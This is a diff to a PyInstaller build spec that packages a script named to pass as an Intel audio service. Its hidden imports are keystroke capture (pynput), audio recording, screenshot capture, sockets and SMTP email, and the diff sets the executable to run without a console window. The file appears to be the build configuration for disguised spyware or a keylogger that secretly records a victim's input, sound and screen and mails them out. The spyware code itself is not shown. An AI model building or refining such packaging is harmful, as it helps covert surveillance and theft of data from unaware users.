@@ -2,11 +2,11 @@
 
 
 a = Analysis(
-    ['Intel(R) Audio Service.py'],
+    ['intelaudioservice.py'],
     pathex=[],
     binaries=[],
     datas=[],
-    hiddenimports=['logging', 'os', 'logging', 'smtplib', 'socket', 'threading', 'wave', 'pyscreenshot', 'sounddevice', 'pynput', 'email', 'glob'],
+    hiddenimports=['logging', 'os', 'platform', 'smtplib', 'socket', 'threading', 'wave', 'pyscreenshot', 'sounddevice', 'glob', 'pynput', 'email', 'subprocess', 'requests', 'json', 'time', 'datetime', 'sys', 'shutil', 'ctypes', 'ctypes.wintypes', 'ctypes.util', 'ctypes.util.find_library', 'ctypes.util._get_build_version'],
     hookspath=[],
     hooksconfig={},
     runtime_hooks=[],
@@ -29,12 +29,11 @@ exe = EXE(
     upx=True,
     upx_exclude=[],
     runtime_tmpdir=None,
-    console=True,
-    disable_windowed_traceback=True,
+    console=False,
+    disable_windowed_traceback=False,
     argv_emulation=False,
     target_arch=None,
     codesign_identity=None,
     entitlements_file=None,
     icon=['icon.ico'],
-    hide_console='hide-early',
 )
